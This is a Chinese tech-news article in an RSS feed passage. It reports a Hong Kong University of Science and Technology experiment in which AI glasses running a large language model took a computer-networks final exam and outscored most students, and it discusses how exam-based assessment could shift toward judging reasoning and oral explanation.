<guid>https://juejin.cn/post/7592119218029428770</guid>    <pubDate>2026-01-06T10:50:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592119218029428770" data-draft-id="7592089325912178688" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="港科大教授实测AI眼镜“作弊”：30分钟碾压95%的学生，把传统教学评估体系整破防了"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-01-06T10:50:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="量子位"/> <meta itemprop="url" content="https://juejin.cn/user/2858385963484488"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            港科大教授实测AI眼镜“作弊”：30分钟碾压95%的学生，把传统教学评估体系整破防了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2858385963484488/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    量子位
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T10:50:55.000Z" title="Tue Jan 06 2026 10:50:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>离了大谱了，AI 真 · 走进了大学期末考场，并且还是以<strong>作弊者</strong>的身份。（你就说震不震惊吧）</p>
<p>没开玩笑，事情就发生在香港科技大学《计算机网络原理》的本科期末考试 “现场”。</p>
<p>一副搭载 ChatGPT-5.2 模型的 <strong>AI 眼镜</strong>，被直接戴上鼻梁，在复刻真实考试条件的情况下，完成了整套期末试卷：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87bd209b23b346698cd16b1f54db5d13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=HXxScAnsLh39RQxzori2MBtZ6Qs%3D" alt="" loading="lazy"/></p>
<p>结果甚是魔幻：30 分钟交卷，狂揽 92.5 分，并在一百多人的排名里跻身进了前五，轻松碾压超 <strong>95%</strong> 的人类考生：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/916f85013bb94c0fb5e895d45db2d6e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=%2BQLqcUFro9kT7Qjn9bcORGReGNc%3D" alt="" loading="lazy"/></p>
<p>果然，一代人有一代人的学习工具，以前是小抄复习资料，这回直接升级成——「整机」。</p>
<p>只不过，当这套整机已经能完整跑完一整套考试流程时，大家关注的重点，可能不再只是 AI 会不会答卷了。</p>
<p>这一次，AI“作弊者” 只是像人类学生那样完整答了一遍题，却让传统的教学评估体系看起来似乎有点站不住脚。</p>
<h2 data-id="heading-0">一副 AI 眼镜，跑完了一整场大学期末考试</h2>
<p>这场看似离谱的「人机同场考试」，可不是学生的临时整活，而是由香港科技大学张军教授、孟子立教授团队主导的一场实验。</p>
<p>目标很明确，那就是让一副搭载大模型的 AI 眼镜，光明正大地在考场 “作弊”，然后看它能考多高分～</p>
<p>其选中的测试场景也是非常的简单粗暴，直接瞄准了令无数大学生《闻风丧胆》的专业课——<strong>计算机网络原理</strong>。（瑟瑟发抖…</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/333ea898573f482fa4b6eedcc069f8a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=bL9yT03KwWOPjzLIbpTD1bvgCcs%3D" alt="" loading="lazy"/></p>
<p>这门课程不仅考查海量的专业概念，更涉及严密的逻辑推导与算法应用，对人类学生来说是不小的挑战，对 AI 而言更是难度拉满。</p>
<p>对此，为了让这位 AI 考生发挥出最强实力，项目组在「软硬件」筛选上可谓是做足了功课！</p>
<p>在硬件筛选环节，项目团队对市面上 12 款主流商业智能眼镜进行了系统评估，其中也包括大家熟悉的 <strong>Meta、小米、乐奇 Rokid</strong> 等厂商的产品：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6eacdf4f8d014eb28cdbec084be10ed3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=4xVHaw8OZZwy%2BjBGpMAIEK%2B9eAM%3D" alt="" loading="lazy"/></p>
<p>第一轮筛选后，团队发现真正同时具备内置摄像头和集成显示屏的产品其实并不多，进入候选范围的主要只有 Meta Ray-Ban、Frame，以及乐奇 Rokid。</p>
<p>但实验还需要进行二次开发，尽管 Meta 提供了设备访问工具包，但并未开放对显示内容的直接控制接口，难以满足实验对信息呈现方式的要求。</p>
<p>相比之下，乐奇 Rokid 的 SDK 更丰富、生态更完善，开发自由度显著更高。</p>
<p>再综合考虑 Frame 在试卷识别等场景下的相机画质限制，研究团队最终选择了<strong>乐奇 AI 眼镜</strong>作为这次人机同场考试的硬件测试选手：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d08374c9bce4ef58d2ec848e18e0d33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=vy6XZTV0Zb7yqyA3D5DGUY1tDpc%3D" alt="" loading="lazy"/></p>
<p>而在决定大脑上限的大模型筛选上，团队则对比了多款主流模型，最终锁定了 OpenAI 目前最新的模型——无论是响应速度还是通用知识能力都较强的 <strong>ChatGPT—5.2</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0e71a9eeb4149618cbea224867860d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=U8hdNhyJqfPwbNLEVX5PZI9Xuj0%3D" alt="" loading="lazy"/></p>
<p>软硬件「考生」均已就位，接下来就是重头戏——大考。</p>
<p>考试过程，可以用丝滑二字来形容：学生低头查看试卷，AI 眼镜通过摄像头快速拍摄题目，并经由 “眼镜—手机—云端” 链路将图像传输至远程大模型完成推理，生成的答案再沿相反路径返回，最终显示在眼镜屏幕上，供学生抄录。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/165828d66d9a4834b29ef9d66c394e0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=r%2FPkenQcCpfDWfjcMaGUSDuxR2A%3D" alt="" loading="lazy"/></p>
<p>结果您猜怎么着？这款基于 Rokid Glasses 开发、搭载 GPT-5.2 模型的 AI 眼镜，在本次期末考试中拿下 92.5 分，成绩超过了 95% 的学生。</p>
<p>不仅如此，在多项选择题和单页短答题中，乐奇 Rokid 均获得满分，即便是难度更高的跨页短答题（SAQ），也拿到了大部分分数：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0c8cffc4441442e9afaa525bddbcc44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=QATzQ%2F2Td3vpAUh33%2Bm9SVjvsRU%3D" alt="" loading="lazy"/></p>
<p>此外，在面对那些核心问题被拆分在不同页码、高度依赖上下文逻辑的跨页短答题，乐奇 Rokid 依然展现出了极强的推理连贯性。</p>
<p>即便在计算最复杂的部分偶尔出现偏差，但 AI 给出的中间步骤也算得上非常完整，在处理高压知识任务时也是手拿把掐～</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd2d19095eb74644b4eb0822606df761~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=UcwcXprxKxuCptPAdCTW7QjZzQ8%3D" alt="" loading="lazy"/></p>
<p>当然，这场测试在跑通软件逻辑的同时，也无情地照出了目前商业 AI 眼镜存在的《短板》。</p>
<p>首先暴露出来的，是<strong>功耗问题</strong>。</p>
<p>在考试这样的高压连续场景下，连接本身就已经成为主要耗电源，实验中只要开启 Wi-Fi、持续进行高分辨率图像传输，30 分钟内眼镜电量就会从 100% 迅速跌到 58%。</p>
<p>换句话说，如果 AI 眼镜要真正走向全天候、长时间使用，功耗控制和连接稳定性依然是绕不开的工程瓶颈…</p>
<p>不仅如此，项目团队还发现眼镜摄像头的「清晰度」会直接决定 AI 的视力，一旦题目出现模糊、反光或拍摄角度偏差，再强的模型也只能在不完整信息上做推理，最终体现在答题表现上的，就是明显下滑的稳定性。</p>
<p>但… 这场测试带来的冲击和反思，并不只停留在技术层面。</p>
<p>在不做任何特殊照顾的前提下，AI 眼镜依然能够把一整套读题—理解—作答的流程跑得又快又稳，这反过来照出了一个更值得注意的问题——</p>
<p>当教学评估主要关注的只是最后有没有交出一份「标准答案」时，它恰好落在了 AI 最擅长、也最稳定的能力区间里。</p>
<p>也正因为如此，那套以知识点掌握程度和标准解题路径为核心的教学评估方式，在一个早已被各种 “学习机” 包围的时代，开始显得有些吃力了。</p>
<h2 data-id="heading-1">有了聪明的 AI，传统教学评估标准还站得住脚吗</h2>
<p>不知道大家有没有发现一件挺有意思的事情：</p>
<p>从小学一路考到大学，我们最熟悉的考试，其实一直在反复确认同一件事，那就是有没有把老师讲的内容记住，以及能不能按标准方法，把题一步步算对。</p>
<p>u1s1，在很长一段时间里，这套评估方式确实挺管用。</p>
<p>因为在记忆、计算、按步骤推导这些能力上，人和人之间确实存在明显差距，有人记得牢、算得快，有人就是会漏步骤、算错数。</p>
<p>成绩单上的数字，也确实能覆盖一个人相当大比例的学习表现。</p>
<p>但问题在于，当 AI 开始在这些评估维度上，也变得又快、又稳、而且几乎不出错时，事情就开始变得微妙了…</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01c67f313c9248c589a43d7086b9b6cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=cSnsJf%2FYi3cSDqMeLPgXYffX9ck%3D" alt="" loading="lazy"/></p>
<p>此前，一位创业者小孩哥 Eddy Xu 通过改装 Meta 智能眼镜，做出了一套可以在国际象棋比赛中实时显示最优解法的 “作弊” 设备，在几乎不需要自己思考的情况下，就能稳定赢下对局：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f0c013f82a844bfb48171ac4196298d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=nMb0e%2FxJ44DUxJVKBIa95uY2dv8%3D" alt="" loading="lazy"/></p>
<p>在这个过程中，AI 眼镜不会紧张，也不会疲劳，更不存在临场波动，一个字形容——稳。</p>
<p>这和乐奇 Rokid 眼镜参加期末考试的表现其实是同一套逻辑：只要题目规则清晰、评价目标单一，AI 就能把读题—理解—推理—作答这套流程稳定跑完。</p>
<p>哪怕脱离纸笔形态，它依然能在高度结构化的考试里，持续拿到高分。</p>
<p>类似的案例并不只发生在个人层面。</p>
<p>此前，英国雷丁大学的一项研究还发现，当研究人员将 AI 生成的答卷混入考试题库后，有高达 94% 的试卷成功 “浑水摸鱼”，而这些 AI 的平均成绩，甚至还明显高于真实学生…（天塌啦</p>
<p>这下是真有点尴尬了——比人比不过，比 AI 也比不过：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fa0872e57cd4b368abf1c4f9e926a75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=pOE5nYuMhPTkbdtFqfri5nuI6EY%3D" alt="" loading="lazy"/></p>
<p>让人大跌眼镜大开眼界的同时，一个原本不那么尖锐的问题被直接推到台前——</p>
<p>当 AI 或机器比人更擅长按标准作答时，那套以笔试为核心、用来衡量知识点掌握程度的评估体系，到底在测什么？</p>
<p>回过头看教学培养的最初目的，我们会发现很多被反复强调的重要能力，其实并不天然适配 “一张试卷” 这种形式。</p>
<p>——比如提出好问题的能力。</p>
<p>——在信息不完整时做判断的能力。</p>
<p>——在多种方案之间权衡取舍的能力。</p>
<p>——以及理解现实情境、理解他人立场的能力。</p>
<p>……</p>
<p>这些能力真正指向的是学习过程、思考路径和决策质量，答案是否标准只是其中很小的一部分。</p>
<p>也是长期以来最难被传统笔试捕捉，最容易被系统性忽略，恰好也是 AI 最难替代、也最能区分学生真实素养的地方。</p>
<p>从结果导向，转向对推理路径、探究过程、跨学科整合与创造性解题能力的整体评估，这也许才是 AI 眼镜进入考场后，对现有教学评估体系提出的那道真正难题。</p>
<h2 data-id="heading-2">评估重心从「交答案」到「交思路」</h2>
<p>教育心理学家加德纳曾在《Frames of Mind》中提到，人类至少拥有 8 种不同类型的智能——</p>
<p>包括语言、逻辑数学、空间、音乐、人际、内省、身体运动、自然观察。</p>
<p>从这个视角看，人类能力本身就是一个高度多维的结构，而我们所熟悉的教学评估体系，长期以来却只集中捕捉了其中非常狭窄的一段。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4d07510b683412b9440abfa1c5b190d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=%2Bxib43s1HNHcqhet4clZDpujqcg%3D" alt="" loading="lazy"/></p>
<p>这也不难解释，为啥一些在标准化测试中表现并不突出的学生，反而能在真实世界中展现出更强的创造力、协作能力和复杂问题解决能力。</p>
<p>毕竟单一考试成绩更多反映的只是学生在「标准化环境」中的发挥稳定性，像真实情境下的个人综合素质其实显露不太出来……</p>
<p>也正因如此，如何评估创新能力、批判性思维和复杂问题解决能力，正在成为教育评估体系绕不开的一个现实难题。</p>
<p>目前一些指向不同方向的评估尝试，已经出现～</p>
<p>前不久，纽约大学 Stern 商学院教授 Panos Ipeirotis 推出了一套由 AI 支撑的口试评估方式，学生不仅要提交作业，还需要当场解释自己的决策依据和思路走向，在对话中把理解与推理展开来。</p>
<p>这套机制中，AI 先充当考官进行追问，再参与到后续评估环节。</p>
<p>Claude、Gemini 和 ChatGPT 会分别对口试转录进行独立评分，随后交叉审查并修订结果，用来判断学生是否真正理解问题，同时暴露教学中的共性盲区：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25e432159a4146828f6b13555050c215~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301455&amp;x-signature=TSEYU6KLfZgEnW2xNvz4ZltqY9w%3D" alt="" loading="lazy"/></p>
<p>怎么说呢，感觉这种做法谈不上专门 “对付”AI，但确实把教学评估重心往理解本身挪了一步。</p>
<p>类似的变化并非个例，此前《华盛顿邮报》也提到，目前国外部分高校已经开始引入口试、展示型作业等形式，本质上也是为了让学生的思考过程变得显现。</p>
<p>所以回过头看，当搭载 GPT-5.2 的乐奇 AI 眼镜走进考场并交出高分时，AI 是否「考赢」了学生似乎也没有那么重要了。</p>
<p>它更像一次特别但清晰的显影实验，让一个长期存在却很少被正视的问题浮出水面：</p>
<p>传统教学评估高度依赖最终答案，却几乎无法刻画整个学习过程。</p>
<p>分数当然是有意义的，但它所能解释的范围正在变窄，理解是否真正发生、思路是否连贯、判断是否经过取舍，这些关键环节，仍然被压缩成一个单一结果，难以被区分和看见。</p>
<p>也正是在这一点上，单纯地把技术挡在门外，其实已经很难回应问题本身了。（也不见得阻挡得了…</p>
<p>更现实的挑战，变成了如何让学生把 AI 用在信息整理、方案推演和假设验证上，把人的精力集中到判断、理解和选择这些无法被「外包」的环节。</p>
<p>当工具可以稳定完成信息提取与标准作答，课堂与考试是否还能区分不同层次的思考，正被推到台前。</p>
<p><strong>欢迎在评论区留下你的想法！</strong></p>
<p>— <strong>完</strong> —</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[推理之父走了！OpenAI 七年元老离职：有些研究这里没法做]]></title>    <link>https://juejin.cn/post/7592068193419788297</link>    <guid>https://juejin.cn/post/7592068193419788297</guid>    <pubDate>2026-01-06T10:52:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592068193419788297" data-draft-id="7592069432227561481" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="推理之父走了！OpenAI 七年元老离职：有些研究这里没法做"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-06T10:52:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            推理之父走了！OpenAI 七年元老离职：有些研究这里没法做
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T10:52:03.000Z" title="Tue Jan 06 2026 10:52:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 